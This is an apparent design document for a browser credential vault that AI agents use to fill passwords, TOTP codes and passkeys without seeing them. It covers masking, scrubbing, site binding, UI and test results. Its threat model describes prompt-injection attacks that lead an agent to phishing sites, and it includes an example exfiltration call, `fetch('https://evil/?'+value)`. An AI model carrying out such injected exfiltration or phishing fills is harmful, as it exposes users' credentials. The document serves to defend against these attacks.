| `browser_snapshot` (accessibility tree) | Blink replaces a password field's accessibility value with • of the same length (`IsPasswordFieldAndShouldHideValue`, verified with CEF 154 in step 1 of section 12). Yardlet replaces that value with `<redacted>` too, so the length does not show (the same marker as Codex `browser-service.mjs`, section 10). This rule always applies, vault or not. On a filled document, the fields that took a value and the innermost elements whose text shows one (a code drawn in boxes of the page's own) read as `<redacted>` by node, with nothing of what is in them, so a code split over one-digit boxes does not show; when Yardlet cannot tell which those are, the snapshot is refused. Values are scrubbed from each name and value before a long one is cut. As a backstop, "scrubbing matching strings" below covers everything else |
| `browser_screenshot` | Refused on a filled document, for as long as `browser_evaluate` is: a page can draw a value again in ways no cover of the filled fields reaches (a field of its own, a canvas, a code in boxes). While the vault is on, a screenshot that shows a two-factor setup QR code is not handed over; its key is scrubbed from results and the page counts as filled. The element picker's picture, which the person attaches, hides typed values and is left out when they cannot be hidden |
| `browser_console_messages` | Messages that a filled document logged are left out, and the result says how many |
| Every text result (snapshot, page address and title, `browser_wait_for`, console, JS dialog text, tab list, errors, notes at the end of a result) | **Scrubbing matching strings:** a value filled in the last 30 minutes is replaced with `[saved value]` (the same convention as GitHub Actions secret masking): as written, escaped in JSON, in base64 or hex, and each of these percent-encoded once or twice in either case, with `+` or `%2B` for a space. A password the person typed into a sign-in form they submitted in a task's tab is scrubbed the same way. This happens in the one place where `BrowserAgentTools.run` collects results. The values are only in memory and are discarded after 30 minutes |
| Addresses the page opens | See "Filled values and addresses" below: the browser host refuses the navigation before anything is sent |
| What Yardlet keeps of pages | A tab does not remember an address or title that carries a filled value: the task's saved tabs, a closed tab to reopen and the tabs reopened after the browser host ended keep the page before it, and the address field's history does not count it as a visit |
| Harness conversation history | If the above holds, values have no path into the history. Provider history is not edited |
| Yardlet and host logs | CDP messages are not logged (even now the DEBUG host writes only a dialog's ID and whether it was accepted). Fill commands carry a "sensitive" mark so future logs leave them out too, and the usage log has no values. The DEBUG raw accessibility dump (`accessibilityRecordPath`, QA only) runs only in QA homes where the vault is off |
| Clipboard | Agents get no tool that copies a value. A code the person copies in Settings → Passwords, and a shown password or setup key the person copies out of the item sheet, are marked `org.nspasteboard.ConcealedType` and cleared after 90 seconds unless something else was copied since (1Password's default); Universal Clipboard still carries them to the person's devices. The agent's paste key does not paste a clipboard marked concealed. Any process of the person's can still read the clipboard during those 90 seconds |
| Chromium autofill and session restore | Password fields are left out of Blink's form state saving, and the host turns off Chrome's address and card autofill (which also stops form history) and Chrome's password saving (`credentials_enable_service`, `credentials_enable_autosignin`) in every profile |
| `items.json` | The item list is a plain file any process of the person's can write. Each secret in the keychain keeps the item's sites and agent policy as Yardlet saved them; a fill (the agent's or the key button's) of an item whose `items.json` entry differs is refused and the person is told to open the item and save it again. A secret saved before this took the item's values at its first use |
| `browser_press_key` editing commands | Paste (`Meta+V`) is refused while the clipboard is marked concealed |
| The site's own scripts | Not blocked. The point is to give that site the password, so the exposure is the same as with every password manager. Instead, filling is bound to the registrable domain |

### 5.4 Filled values and addresses

When the vault fills a password into a page, for an agent or for the person, Yardlet first tells the browser host the
password's spellings (section 5.3, `guardFilledValues`). Until the tab's main frame starts another document, the host
refuses, before the request is sent (CEF `OnBeforeBrowse`, and a page's request for a new window), any navigation of the
tab, in any frame and including a redirect, whose address carries the password, as written or percent-encoded once or
twice, with or without `+` for a space. A form's body is not looked at there: CEF does not give `OnBeforeBrowse` a
navigation's body. Where a form sends a password is checked before the fill instead (section 5.2, step 4).

The host says only that it refused (`filledValueBlocked`), never the address. The panel shows a notice over the page, and
the agent's next result on that tab says what happened and what to do. One-time codes are scrubbed from results but do
not hold navigations: they expire in seconds, and a site that sends one in its address would otherwise not sign in.

Yardlet also keeps such an address out of what it remembers (section 5.3). Addresses that a build without these rules
kept are removed once as Yardlet starts (`BrowserFilledValueCleanup`), in a team-signed build that can read the vault's
items: from Chromium's history and icons in each profile and its URL-keyed metrics, and from each task's saved browser
tabs (such a page keeps its site and path and loses its title) and the address field's history. Only an entry whose address carries a vault password
whole, as a query or fragment value, a path segment, or inside an address in a parameter, goes, and nothing is backed
up. A store the browser host holds open is tried again at the next start.

A page's own scripts can still send what they read from a field elsewhere: with `fetch` or another request that is not
a navigation, or by pointing its form at another site after the fill. That is the site's own code (the last row of
section 5.3).

## 6. Policy while the person is away

### 6.1 Person confirmation step (per item)

| Step | When filling | Use |
|---|---|---|
| Always (default, including while away) | Does not ask | Aside "Always allow" (the same as Aside's default). Sites added to the vault carry on without the person right away |
| While unlocked | Does not ask if the vault is unlocked. If it is locked, asks for Touch ID once, then not again until it locks | Aside "While unlocked". For sites where work should stop while the person is away |
| Every time | Touch ID on every fill (the login password if there is no Touch ID). Refused if there is no answer within 2 minutes; while waiting, a notification "‘Task’ is waiting to sign in to github.com" | The same as 1Password Agentic Autofill. For accounts the person wants to see every time, such as a bank or a company admin account |

- Whatever the step, the harness's tool approval sits above it. In a task at a level that asks, Claude Code or Codex
  asks about the `browser_fill_credential` call first.
- The step is changed directly in the item sheet (no Touch ID when moving it up or down; before the user correction on
  2026-10-24, moving it up to "Always" asked for Touch ID).

### 6.2 Binding to sites

- An item has a list of sites, and matching works per registrable domain (eTLD+1, by the Public Suffix List). A
  `github.com` item also fills on `www.github.com` and `gist.github.com`, but not on `github-login.com` or other sites
  under `github.io` (the same as 1Password's default matching). Creating an item adds the page's site, and the person
  can add more (for services that sign in on a different domain: `notion.so` and `notion.com`).
- Only https is accepted. CEF blocks certificate error pages. Development `http://localhost` is accepted only when the
  person adds it to the site list by hand.
- Both the frame holding the field and the top-level document must be on that registrable domain (the same as Aside's
  "Blocks cross-site agent autofill"). A sign-in iframe embedded in another site is not filled.
- When an item named explicitly is refused because it belongs to another site, that is a phishing sign, so Yardlet sends
  a notification (section 6.3).

### 6.3 Usage log and notifications

- **Usage log** (`usage.jsonl`): time, task ID and title, harness, item, site, kind filled, result (filled, or refused
  with the reason), confirmation method (Touch ID, unlocked, always). It shows in the item sheet's "Recent use" and the
  settings list's "Last used".
- **Notifications** (Yardlet notifications; clicking one opens that task) are sent only when the person has something to
  do: when "Every time" or a locked vault is waiting for Touch ID, and when an item named explicitly was refused because
  it belongs to another site. The notification on every fill was removed (nobody reads notifications that pile up with
  each sign-in overnight, 2026-10-24). The fact of a fill stays in the conversation's tool line and in the usage log.

### 6.4 Auto-lock

- Applies only to the "While unlocked" step. The vault locks when the Mac's screen locks or the Mac goes to sleep. There
  is no timeout.
- "Always" items are not affected by the lock. "Every time" does not use the lock state.

## 7. Threat model

| Threat | Example | How it is blocked | Residual risk |
|---|---|---|---|
| Prompt injection: getting the agent to fill a phishing page | Page text says "sign in on github-login.com with GitHub (work)" | Registrable domain match, origin from the browser, both top level and frame, https, refusal notification | XSS or a malicious third-party script on the legitimate site, or a subdomain someone else uses under the same registrable domain, can read the value (as with all autofill) |
| Injection: the value into another field | Putting the password into a public bio field on the same site and saving | Field kind check (passwords only into `type=password`) | Cannot block a site that shows the password field's value somewhere else |
| Injection: getting the value out through a URL, screenshot or result | `fetch('https://evil/?'+value)` through `browser_evaluate`, a screenshot after "show password" | Refusing `browser_evaluate` and `browser_screenshot` on the filled document and in tabs linked to it, leaving filled nodes out of snapshots, scrubbing the value and its common encodings, and asking the person before a fill on a document the agent ran scripts in (section 5.3) | The site's own scripts can do anything with the value they are given; a site that transforms it and shows it as text can get past scrubbing |
| Injection: harmful actions on a legitimate site | Transferring money or deleting things after sign-in | The harness's approvals and permission modes, the step, the usage log | The vault helps only up to sign-in. Permission for what follows belongs to the harness and the user's permission settings |
| Other apps on the same Mac | A program running as the same user reads the keychain | Items open only for the Developer ID requirement, vault off in ad-hoc builds | A program of the same user can read the `yardlet-mcp` token, but a call must come from under the task's harness process (AGENT_BROWSER_TOOLS sections 4 and 6). It cannot get values |
| Child tasks and other harnesses | Tasks made with `create_task`, Codex and ACP tasks, `run_agent` | The same rules (the tool goes to every harness that gets the browser tools), task and harness in the log | An injected parent can direct a child task. The step and site binding are the same whatever the task |
| Backup and sync | Time Machine, moving to another Mac | The login keychain file is encrypted with the login password, and even when restored it opens only to Yardlet's signature. No iCloud sync | Yardlet passkeys exist only on this Mac, so if the Mac is lost, another sign-in method for the site is needed |
| Tricking the person into using Touch ID | Confirming for the wrong site | Yardlet writes the Touch ID prompt: task title, site and item name. No page text goes into it | — |

## 8. UI

### 8.1 Settings → Vault

Settings has "Vault" in its left list, right after Connectors (the same convention as Chrome and Aside keeping passwords
inside settings).

```text
Vault
  Agent vault                                            [Switch]
  ───────────────────────────────────────────────
  GitHub (work)     github.com      Password, code     Always        Yesterday
  Vercel            vercel.com      Passkey            Always        3 days ago
  Hana Bank         kebhana.com     Password           Every time    —
                                          [Import CSV]  [+]
  ───────────────────────────────────────────────
  Empty Vault…
```

- The switch is on by default. With no items at all, the tool is not added, so for someone who does not use it nothing
  changes.
- Rows: name, site, kind, step, last use. Clicking a row opens the item sheet.
- CSV import takes the `name,url,username,password` shape that Chrome, 1Password and Bitwarden export (the same columns
  as Aside's help page). Imported items also default to "Always". After the import, Yardlet asks whether to move the
  source file to the Trash.

### 8.2 Item sheet

Name, sites, username, password, previous passwords (when a password was replaced; shown after Touch ID, section 15),
two-factor setup key (`otpauth://` or the key), current code (seconds left and copy, section 14), agent use (three
steps), recent use and delete. An item with only a two-factor key is saved without a site
or password (an authenticator app's entry, section 14). The password is a hidden field, and "Show" works only after
Touch ID (the same convention as the Chrome and Safari password screens). A passkey, if there is one, shows only as
"Passkey · made 2026-10-24", and it is not created here (section 8.3).

### 8.3 On a site

- **Save prompt:** when the person submits a sign-in form in the panel (the password field holds a value the person
  typed, and then the page navigates or the form disappears), a native popover "Save the github.com password in the
  vault? [Save] [Not for This Site]" appears under the address bar. If the password differs from an existing item, it
  asks "Update?" instead. Values the agent filled do not trigger it. Detection is done by a listener in Yardlet's own
  isolated world, only on pages with a password field, and the value goes only to the Yardlet process (the same behavior
  as Chrome's save bubble; CEF has no such UI, so Yardlet draws it).
- **Key button in the address bar:** shows at the right of the address bar only on sites that have items in the vault
  (the same convention as Chrome's key in the address bar). Clicking it lists that site's items, and choosing one fills
  the current form for the person. A fill for the person happens right away whatever the step (the person clicked).
- **Page right-click menu** (the existing CEF menu → `NSMenu`): "Add to Vault…" (an item sheet with the current site
  filled in) and "Make a Vault Passkey" (for 2 minutes, the next passkey registration on this tab goes into the Yardlet
  vault, section 5.2; the person clicked the menu, so Touch ID is not asked).
- The autocomplete list attached under the password field (the suggestion card in Chrome and Aside) would have to be
  drawn over off-screen rendering, following the field's position, so it is left out this time. The key button does the
  same job.
- **Two-step verification (2026-10-25, section 14):** when a verification code field shows, the code bar "Fill the
  two-factor code from “GitHub”? [Not Now] [Fill Code]"; when a setup QR shows, the setup bar "Save the two-factor code
  for github.com in “GitHub”? [Not Now] [Save]"; and right-click "Add Two-Factor Code from QR Code".
- **Strong passwords (2026-10-28, section 15):** when an empty new password field takes the focus, the bar "Use a strong
  password for github.com? The password manager saves it. [Not Now] [Use Strong Password]"; on any password field,
  right-click "Use Strong Password".

### 8.4 When it is used

- The conversation shows the tool line just as the harness draws it (`browser_fill_credential`, item name).
- In the panel header, "Vault" appears in place of the "Agent" indicator (4 seconds).
- The Touch ID dialog (system), and notifications when the person has something to do (section 6.3).

No new shortcuts, explanatory text or onboarding screens.

## 9. Turning it on and off, and removing it

- **Turning off** (switch): the tool drops out of the next tool list (`tools/watch` → the next turn for Claude Code, the
  next resume for other harnesses; see "Tool lists of running tasks" in [CONNECTORS](CONNECTORS.md)), the app refuses
  calls from the moment it is off, removes any attached virtual authenticator, and hides the save prompt and the key
  button. Items stay in the keychain (turning off and removing are different, as with turning a connector off and
  disconnecting it). Scrubbing matching strings continues until the 30-minute window ends.
- **Empty Vault**: after a confirmation dialog, deletes every keychain item of service `<bundle ID>.vault`
  (`SecItemDelete`, `kSecMatchLimitAll`), deletes `items.json` and `usage.jsonl`, and removes the virtual authenticators
  from all tabs. At the end it shows the list of sites where a Yardlet passkey is registered, so the person can delete
  the passkey on those sites (Yardlet cannot delete the site-side registration).
- **Deleting an item**: that item's keychain entry and metadata. For a passkey, the same notice.
- **Effect on harnesses**: nothing is written to harness settings files. The conversation history keeps only the call
  line (item name), as with other MCP tools. No values.
- **If Yardlet is moved to the Trash**: the keychain items remain, like connector tokens. Running "Empty Vault" before
  removing Yardlet leaves nothing behind.

## 10. Compared with the two apps (bundle bytes)

The bundles of the Claude app 3.1623.3 (`/Applications/Claude.app`) and the ChatGPT app 26.1016.61520 (Codex,
`/Applications/ChatGPT.app`) were read without running them (2026-10-24; an Astra subagent unpacked the asar files to
investigate, and the key lines below were checked again directly). "None" means not found in the code and strings
checked; whether something is actually turned on is unknown, since the apps were not run.

| Item | Claude app (built-in Browser) | Codex app (local built-in browser) | Other paths in the same apps |
|---|---|---|---|
| A vault the agent fills from without seeing values | None. `form_input` sets ordinary fields with `nativeSet(proto, "value", el, v)` and does not filter out password fields (`index.chunk-DylQWxwC.js`) | None. The tab capability list of the local browser (`type: "iab"`) is only `oje=[rG.info]` (`pageAssets`) and conditional entries, with no `browserAuth` (`main-JI9qDiXp.js`) | Codex: has `browserAuth` ("fills them into this tab without returning the values to the caller", `@oai/browser-desktop/environment-docs/codex-app/capabilities/tab/browserAuth.md`). When the person types into ChatGPT's secure form or picks 1Password, the browser client fills. There is also a cloud vault header (`X-OpenAI-Cloud-Vault-Credential-Fields-Version`). Claude: Claude in Chrome's `claudeInChromePasswordManagersEnabled` and `fillApprovedCredential` (fills an approved credential with the tab and the expected origin), 1Password autofill |
| Instructions for sign-in screens | Hands over to the person. When a passkey fails: "Don't retry it yourself: ask the user to try the passkey step themselves with this tab in front, to pick another sign-in method on the page, or to sign in in their own browser." | (`browserAuth` path) "Never enter or submit sign-in credential values through Playwright, vision, or any other model-visible tool.", not used for account creation or payment details, manual handoff when `unavailable` | Codex leaves a tab that waits for sign-in with `tab.markHandoff()` |
| Masking in results and page reads | Unclear. It copies the accessibility value straight from CDP (`String(e.value.value)`). No handling specific to password fields was found | — | Codex `browser-service.mjs`: for credential fields the value becomes `"<redacted>"`, with an observation restriction (`credential_observation_restricted`) |
| Chromium password manager | None (Electron default) | Codex Framework (a Chromium 155 fork) has `chrome://password-manager/passwords`, password manager right-click commands and save dialog strings. Whether the save prompt actually appears is unknown | — |
| Passkeys | Touch ID WebAuthn (`configureWebAuthn({touchID:{keychainAccessGroup:…`), account picker handling | The component (`TouchIdAuthenticator`) exists, but its connection to the local browser was not confirmed | Neither app calls the CDP virtual authenticator (`WebAuthn.addVirtualAuthenticator`) |
| External managers | 1Password on the Chrome path | 1Password enrollment and brokered access (`/password-managers/1password/enrollment`, `grant-brokered-access`) | No Bitwarden-specific connection was found in either app |

Summary:

- The **local built-in browsers** of the two apps have no vault for agents. In both apps, filling with hidden values
  lives on other paths (Codex's `browserAuth`, Claude in Chrome), and those paths too need the person to type or approve
  on the spot. Getting past TOTP and passkeys without the person is a Yardlet-only feature that neither app has. So
  there is no baseline question of being no worse than the two apps, and the rules for Yardlet-only features that turn
  on and off apply.
- What this design takes from the two apps: the three rules of Codex `browserAuth` (never enter values through a
  model-visible tool, not used for account creation or payment details, credential field values shown as `<redacted>` in
  results) and Claude in Chrome's "fill by passing the expected origin along". These are reflected in sections 5.3 and
  3.
- The Claude app's instruction to hand passkey failures to the person matches Yardlet's current behavior
  (`browser_handle_dialog` accept false, BROWSER_HOST section 3). With the vault off, that behavior stays as it is.

The extracted copies are deleted when the work is done (this document keeps only paths and quotes).

## 11. Decisions

The user decided D0 to D3 one at a time. Following the correction of 2026-10-24 (a design that is too conservative and
safe everywhere pleases nobody), D3's default changed, and this task decided the remaining D4 to D7 in that direction.

| # | Decision | What was decided |
|---|---|---|
| D0 | Long-term direction | Personal agent = harness tasks, Yardlet = the base for the browser, sign-in and being away, vault first (section 0.1). User |
| D1 | What the vault holds, and the order | Passwords → TOTP → Yardlet passkeys → saving from the site and CSV import. No API keys, cards or sign-up (section 4.1). User |
| D2 | Storage location | Keychain only (section 4.3). Behind the `VaultStoring` protocol, so a 1Password service account can be attached later. User |
| D3 | Person confirmation steps and default | The user chose the three steps (Always / While unlocked / Every time); the default for new items changed from "Every time" to "Always" following the user correction (section 6.1) |
| D4 | Auto-lock | Only on screen lock and sleep, no timeout (section 6.4) |
| D5 | Notifications | Only when the person has something to do: waiting for Touch ID, an item named explicitly refused because it belongs to another site (section 6.3) |
| D6 | UI and saving flow | The "Vault" section in settings (on by default), a save prompt when the person signs in, the key button in the address bar, two right-click items, CSV import (section 8) |
| D7 | Child tasks and other harnesses | The same rules (section 7) |
| D8 | Strong passwords (2026-10-28) | Chrome's generator and presave, `passwordrules`, previous passwords kept in the item; agents only for new accounts (section 15) |

## 12. Implementation steps

The work happens on one branch (`browser-vault`) with a commit per step. When step 3 (the agent signs in with a password
and TOTP) and step 5 (passkeys) finish, the branch goes up as a candidate to merge into `integration`. Replacing the
installed app needs separate approval.

| Step | Content | Verification |
|---|---|---|
| 1. CEF check (no product code) | With a QA bundle, a temporary home and local fixture pages: the CDP `WebAuthn` domain in CEF 154 (virtual authenticator, `addCredential`, `credentialAdded` and `credentialAsserted`, `getCredentials`), password field masking in `Accessibility.getFullAXTree`, whether isolated-world filling fires events in plain, React and Vue forms (otherwise `Input.insertText`), whether CEF writes `Login Data` or `Web Data` to the profile, and whether screen lock notifications arrive | The QA record goes into BROWSER_HOST as facts. No secrets or real accounts |
| 2. Vault store and policy (engine + macOS layer) | `VaultItem`, `VaultStoring` and `KeychainVaultStore` (the connector store approach, service `<bundle ID>.vault`), `items.json` and `usage.jsonl`, registrable domain matching (the Public Suffix List bundled), step and lock decisions, TOTP (RFC 6238, CryptoKit HMAC), on only in team-signed builds | Tests only for contracts that must not break unnoticed: site matching including refusal of phishing domains, step decisions, RFC 6238 test vectors |
| 3. Agent filling (sign-in and codes) | The `browser_fill_credential` definition and filling (section 5.2), tracking filled nodes, refusing `browser_evaluate` while filled, covering screenshots, scrubbing matching strings in the one place results pass through, `<redacted>` for password fields in snapshots, the tool in the list only when the vault is on and has items (`tools/watch`), a minimal settings list and item sheet | Scrubbing matching strings and the refusal while filled leak values unnoticed if they break, so they are added to the existing browser tool tests. On a real CEF host with a local sign-in fixture: fill, submit, snapshot and screenshot; direct `yardlet-mcp` calls and tool calls from Claude and Codex (without a model turn, the way AGENT_BROWSER_TOOLS section 7 does it) |
| 4. Person-side UI | The save prompt popover (an isolated-world listener only on pages with a password field the person typed into), the key button in the address bar and filling for the person, two right-click items, CSV import, the Touch ID gate (LocalAuthentication), notifications, "Vault" in the panel header | Light and dark renders, and QA of clicks, typing and popovers in the real panel |
| 5. Yardlet passkeys | Registration (right-click → empty virtual authenticator → `credentialAdded` → keychain), use (`kind: passkey`, 60 seconds and once, signature count update), the site notice on deletion | A localhost RP fixture, then registration and sign-in on `https://webauthn.io` with a test name (no real account) |
| 6. Turning off, removing and docs | Turning off (removing the tool, refusing calls, removing authenticators, hiding the UI), Empty Vault, the AGENT_BROWSER_TOOLS section 2 table and BROWSER_HOST | `swift build`, `swift test --filter` for the changed contracts, end to end in the QA bundle |

**Risks**

- If CEF 154 lacks the CDP `WebAuthn` domain or it differs, step 5 is blocked. Then the work goes as far as TOTP and
  drops Yardlet passkeys (step 1 finds this out first).
- Sites that block automated sign-in (new-device email checks, CAPTCHA, bot detection) cannot be passed with the vault.
  The next layer in section 0.1, "hand off and wait", takes those.
- A site's terms of service may restrict automated sign-in. Which sites go into the vault is the user's call.
- Risks accepted with the user correction: new items are "Always" right away, so an injected task can also sign in to
  that site. Site binding, field kinds, the refusal while filled and scrubbing matching strings still block as before.
  A fill on a document where the agent ran its own scripts asks the person first (2026-10-28; until then it was
  accepted).
- The Public Suffix List is bundled, so it updates only with app updates.
- The save prompt listener's effect on page performance is limited to pages with a password field and measured in the
  step 4 QA.
- Who may call the fill tool for a task follows AGENT_BROWSER_TOOLS section 4: the task's token, from under the
  harness process Yardlet started for it (section 7).

### 12.1 Results (2026-10-24)

| Step | Result | Verification |
|---|---|---|
| 1. CEF check | The CDP `WebAuthn` virtual authenticator works in CEF 154 (registration, the private key, signing in after adding it back). A password field's accessibility value is one • per character. Plain and React-style fields accept isolated-world filling. Chromium does not save passwords, and plain text field values stay in the autofill history | QA bundle `run-check.sh … --ui-fixture-browser-check-only=vault`, BROWSER_HOST section 3, "Vault" |
| 2. Store and policy | `Vault/` (items, secrets, TOTP, sites, decisions, log), the keychain store, Touch ID, screen lock | 3 `VaultTests` (site matching, RFC 6238, refusal on other sites) |
| 3. Agent filling | `browser_fill_credential` (sign-in and codes), refusing `browser_evaluate` while filled, screenshot masking, scrubbing matching strings, snapshot `<redacted>`, the tool list condition | 1 in `BrowserAgentToolsTests`, 19 QA checks |
| 4. Person-side UI | Settings "Vault" (list, sheet, CSV, emptying), the save bar, the key button, two right-click items, "Vault" in the header, notifications | 5 QA panel checks with PNGs, settings renders |
| 5. Yardlet passkeys | Registration by the person (empty authenticator for 2 minutes), use by the agent (60 seconds, once), signature count, refusal on other sites | 5 QA checks |
| 6. Turning off, removing, docs | When off: tool removed, calls refused, authenticators removed, UI hidden; emptying; AGENT_BROWSER_TOOLS and BROWSER_HOST | The turn-off checks in the QA above, docs |

## 13. What changed during implementation

- **Storage location:** the item list and usage log live not in `~/Library/Application Support/Yardlet/Vault/` but in
  `~/.yardlet/vault/`, like Yardlet's other storage (`items.json`, `usage.jsonl`, folder 0700 and files 0600).
- **Scope of masking and refusal:** only password and code fields count. A username is not a secret, so it is not masked
  in screenshots, and on a first sign-in screen where only the username was filled, `browser_evaluate` keeps working (QA
  "a first step takes the username alone").
- **Frames:** filling covers only fields in the main frame. A sign-in form inside an iframe is refused (starting with
  the scope where the origin can be checked from browser values).
- **Passkey registration:** right-click "Make a Vault Passkey" takes the next registration on this tab for 2 minutes
  without Touch ID (the person clicked the menu). If the site has one item, the passkey is added to it; if it has none
  or several, a new item named after the site is created.
- **Autofill history:** the host turns off Chrome's address autofill, which also stops the profile's form history, so
  usernames and code digits that the person or the vault enters are not kept there (section 5.3). Entries kept before
  the setting are left in place.
- **Public Suffix List:** `public_suffix_list.dat` (2026-10-22 edition, MPL 2.0) is bundled and read the first time it
  is needed. The packaged app reads only its own Resources. This fixed a hang in the first QA: the app fell through to
  SwiftPM `Bundle.module`, tried to open the development folder (`~/Desktop`), and stopped while waiting for macOS's
  folder access prompt.

## 14. Two-step verification for the person: a built-in authenticator (2026-10-25)

The request was to handle two-step verification (MFA) inside Yardlet too: an authenticator app built in, so the person
does not have to open the one on the phone. The goal is not password management but not needing a phone authenticator
app (such as Google Authenticator).

### 14.1 What existed before and what did not

| What existed | What did not |
|---|---|
| TOTP secrets in items (a setup key or a pasted `otpauth://` in the item sheet), RFC 6238 computation | Code filling for the person: the key button filled only the username and password (`valuesForPerson` did not return the code) |
| The agent's `browser_fill_credential` `kind: one_time_code` | The current code, time left and copy in the vault screen |
| | Reading setup QR codes ("finding the QR" in the section 2.2 table of this document was only a plan) |
| | Items without a site: the item sheet required a site |
| | Moving over from authenticator apps (Google Authenticator export QR, the TOTP column in CSV) |

### 14.2 Other apps compared (official help pages, read and cited by an Astra subagent on 2026-10-25)

| Flow | 1Password | Bitwarden | Apple Passwords app and Safari | Yardlet (this change) |
|---|---|---|---|---|
| Saving a setup QR | The extension's item menu "Scan QR Code" ([help](https://support.1password.com/one-time-passwords/)) | The TOTP button in item editing reads the QR on the current page, "The full QR code must be visible on-screen." ([help](https://bitwarden.com/help/integrated-authenticator/)) | Safari recognizes an `otpauth:` QR in an image and offers setup from the right-click menu ([WWDC21](https://developer.apple.com/videos/play/wwdc2021/10105/)); the Passwords app takes a setup key in "Set Up Code" ([help](https://support.apple.com/en-ca/guide/passwords/mchl873a6e72/2.0/mac/26)) | The panel reads the QR on screen and offers it with the setup bar; right-click "Add Two-Factor Code from QR Code" |
| Code at sign-in | Filling a sign-in fills the code too, inline menu ([help](https://support.1password.com/one-time-passwords/), [release notes](https://releases.1password.com/b5x/stable/)) | Inline menu and shortcut, the code copied automatically after sign-in autofill (on by default) ([help](https://bitwarden.com/help/auto-fill-browser/)) | One click on the autofill suggestion ([WWDC21](https://developer.apple.com/videos/play/wwdc2021/10105/)) | One click on the code bar when a code field shows; the key button gives the code when clicked from a code field |
| Viewing and copying codes | Item details | Item details | Clicking the code in account details copies it ([help](https://support.apple.com/en-ca/guide/passwords/mchl873a6e72/2.0/mac/26)) | Settings → Vault "Two-factor codes" list and the item sheet: code, seconds left, copy |
| Moving over from authenticator apps | — | Bitwarden Authenticator imports Google Authenticator QR codes ([help](https://bitwarden.com/help/authenticator-import-export/)) | — | Google Authenticator export QR (image files or a page), the `OTPAuth` and `login_totp` columns in CSV |
| A code whose item has no website for the page | Not found in the official help | "all autofill methods with the browser extension require your login items to have an assigned website URI"; in the item, "Autofill and save" fills and adds the page's URI ([help](https://bitwarden.com/help/auto-fill-browser/)) | A code is set up inside an account, which has its website ([help](https://support.apple.com/en-ca/guide/passwords/mchl873a6e72/2.0/mac/26)) | The code bar offers a code with no site whose name names the page's site; filling it saves the site (section 14.3) |

The 2FAS authenticator's browser extension, whose codes have no domain either, asks on the phone which code goes with a
site the first time, because "it doesn't know which token should be assigned to the X.com domain", and answers that
site's later requests with that code right away ([help](https://2fas.com/support/2fas-auth-browser-extension/why-does-sometimes-the-2fas-app-send-tokens-automatically-and-sometimes-ask-to-select-a-token/)).
None of these guesses a website when codes are imported: the site is saved when the person picks the code on it.

Google Authenticator makes the QR in "Transfer accounts → Export accounts", and with many accounts there can be several
QR codes ([help](https://support.google.com/accounts/answer/1066447?hl=en&co=GENIE.Platform%3DAndroid)). That QR's
format (`otpauth-migration://offline?data=`, protobuf `MigrationPayload`) is not in Google's official docs; it is a
widely used reverse-engineered format. According to its official help, Microsoft Authenticator cannot export to other
apps, and backup and restore work only between devices of the same kind
([help](https://support.microsoft.com/en-us/authenticator/back-up-your-accounts-in-microsoft-authenticator)).

### 14.3 Decisions

- **At sign-in:** when the panel's watcher script (in Yardlet's isolated world) sees a verification code field, it
  reports it, and if that site's item has a code, a code bar appears over the page (the same shape as the save bar).
  Clicking it fills the current code into the field. With several items, the person picks one from a menu. The key
  button fills the code when focus is in a code field, or when the page has only a code field and no sign-in fields. The
  person clicked, so it fills whatever the step (section 6.1), as the key button does.
- **Deciding what is a code field:** for filling, the step 3 rule of section 5.2 gained fields whose name, id,
  placeholder or accessible name means a verification code (`otp`, `one-time`, `2fa`, `mfa`, `verification code`,
  `passcode` and so on); the agent and the person share the same rule. For showing the bar, the check is narrower, to
  leave out short numeric fields such as postal codes: `autocomplete=one-time-code`, those names, or a numeric-input
  field of at most 8 characters. It reports a field once while that field is visible in a document.
- **At setup:** when the watcher script sees an image of QR size and shape on screen (a near-square `img`, `canvas` or
  `svg`, 96 to 640 CSS px), it reports it, and Yardlet captures that tab's screen with CDP `Page.captureScreenshot` and
  reads the QR with Vision (`VNDetectBarcodesRequest`). If it finds an `otpauth://totp/` address whose key is not yet in
  the vault, it shows the setup bar. The default target is the site's item whose username matches the QR's account;
  failing that, the site's only item; failing that, a new item for the site. With several items, [Save] saves to the
  default target, and the arrow beside it picks another item or "New Item". After saving, if the page has a code field
  (the field asking for the first code to finish setup), the new code is filled right away. The code bar does not show
  on a setup page (that field belongs to the new code). An `otpauth:` link on the page is taken through the same bar.
- **The path the person chooses:** the page right-click "Add Two-Factor Code from QR Code" reads the current screen. It
  also shows on pages that are not sites (image files). If nothing is found, it says "No two-factor QR code is on the
  screen." A key put off with "Not Now" is not asked about again while that tab is visible, but this menu reads it
  again.
- **Moving over:** Settings → Vault "Import QR Code…" (several image files) and the right-click above read Google
  Authenticator's `otpauth-migration://` and create an item without site or password for each time-based account. The
  name is the issuer (or the account if there is none), and the username is the account. Keys already present are
  skipped, and counter-based (HOTP) and MD5 accounts are counted and reported. An imported image is a file that holds
  the secrets in the clear, so, as with CSV, Yardlet asks whether to move it to the Trash. CSV import reads the
  `OTPAuth` column of 1Password and the Apple Passwords app and Bitwarden's `login_totp` column, and also accepts rows
  with only a code and no password (the Apple column name was confirmed from community sources).
- **Vault screen:** Settings → Vault has a "Two-factor codes" list with a row for each item that has a code (name,
  account or site, the code split into two groups, a ring showing the seconds left, copy). The item sheet has the same
  row. Copying adds `org.nspasteboard.ConcealedType` so clipboard history apps do not keep it. Viewing a code does not
  ask for Touch ID (the same level as the person's key button fill, and phone authenticator apps do not ask by default
  either). The keychain is read only while this list is visible.
- **Items without a site:** like an authenticator app's entries, they show and copy the code, and an import saves them
  without a site, since an issuer such as "Amazon Web Services" names no domain. When a code field shows and none of the
  site's own items has a code, the code bar offers the codes with no site whose name names the page's site: the name,
  or its first word, is the registrable domain's own label apart from case, spaces and punctuation (`Vercel` for
  `vercel.com`, `Amazon Web Services` for `signin.aws.amazon.com`, not `Vercel` for `vercel-login.com`). The bar says
  the site it keeps ("Fill the two-factor code from “Vercel” and link it to vercel.com?"), and filling it saves that site
  in the item, as Bitwarden's "Autofill and save" and 2FAS do (section 14.2); from then on it is the site's code for the
  code bar and the agent. Nothing is saved before the person picks a code, and a code whose name names no site (a
  personal label) still gets its site in the item sheet. An agent never fills a code with no site: its refusal names
  the code and says the person can fill it once from the code bar, and asking for one by name is no phishing sign
  (section 6.3).

### 14.4 Rules kept

- Values do not go to the model: passwords and codes the person fills also go onto the matching-string scrubbing list
  (section 5.3) and are scrubbed from agent tool results for 30 minutes. The watcher script sends no values (only the
  fact that a code field or a QR is there, and the document address). The QR's secret is read only inside the Yardlet
  process.
- Fill only when the site matches: filling from the bars and the key button picks the item by the main frame origin the
  browser reports (`valuesForPerson`).
